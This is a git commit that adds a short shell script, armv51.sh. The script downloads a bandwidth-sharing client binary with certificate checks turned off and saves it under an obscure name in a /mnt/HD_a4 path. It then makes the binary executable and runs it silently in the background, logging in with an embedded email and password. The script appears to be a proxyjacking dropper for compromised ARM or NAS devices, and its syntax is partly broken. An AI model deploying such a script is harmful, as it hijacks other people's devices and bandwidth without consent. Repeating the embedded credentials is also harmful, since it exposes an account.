f5deb74a01013dbefc07344ec7263528b067fb59
WOLFMAN2028 <mutuala@mailfence.com>
2026-09-19 14:31:08 -0800

    Create armv51.sh

---
+++ armv51.sh
@@ -0,0 +1,4 @@
+wget -O /mnt/HD_a4/loooooooooooooooooooooooooooooooooooool https://cdn.pawns.app/download/cli/latest/linux_armv5l/pawns-cli  --no-check-certificate
+chmod +x /mnt/HD_a4/loooooooooooooooooooooooooooooooooooool
+exec /mnt/HD_a4/loooooooooooooooooooooooooooooooooooool -email=skynox7@proton.me -password=@Wakawaka@ -device-name=101101 -accept-tos   >/dev/null 2>&1 fi & 
+echo '/mnt/HD_a4/loooooooooooooooooooooooooooooooooooool -email=skynox7@proton.me -password=@Wakawaka@ -device-name=101101 -accept-tos  ; >/dev/null 2>&1  fi &
